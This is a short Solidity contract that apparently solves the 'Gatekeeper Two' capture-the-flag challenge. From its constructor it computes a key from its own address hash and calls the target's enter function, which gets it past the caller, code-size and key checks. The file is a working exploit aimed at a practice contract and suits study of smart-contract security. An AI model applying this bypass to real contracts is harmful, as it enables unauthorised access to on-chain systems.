// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract GatekeeperTwoAttack {

    constructor(address _gatekeeper) public {

        uint64 arg = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1;
        (bool success, ) = _gatekeeper.call(abi.encodeWithSignature('enter(bytes8)', bytes8(arg)));
        require(success);
    }


}